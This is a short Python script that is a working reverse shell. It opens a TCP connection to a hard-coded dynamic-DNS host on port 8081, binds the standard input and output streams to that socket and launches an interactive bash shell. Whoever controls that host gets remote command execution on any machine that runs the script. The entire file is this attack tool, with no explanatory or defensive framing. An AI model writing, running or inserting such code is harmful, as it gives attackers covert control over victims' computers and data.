import socket
import os

def main():
    # Server data
    ip_addr = "posydon.ddns.net"
    port = 8081

    # Creating socket
    shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connecting to the server
        shell_socket.connect((ip_addr, port))
        
        # Redirect stdin, stdout, stderr to the socket
        os.dup2(shell_socket.fileno(), 0)
        os.dup2(shell_socket.fileno(), 1)
        os.dup2(shell_socket.fileno(), 2)

        # Execute a shell
        os.execlp("bash", "bash", "-i")
    except Exception as e:
        print(f"[!] Socket Connection Error: {e}")
    finally:
        shell_socket.close()

if __name__ == "__main__":
    main()

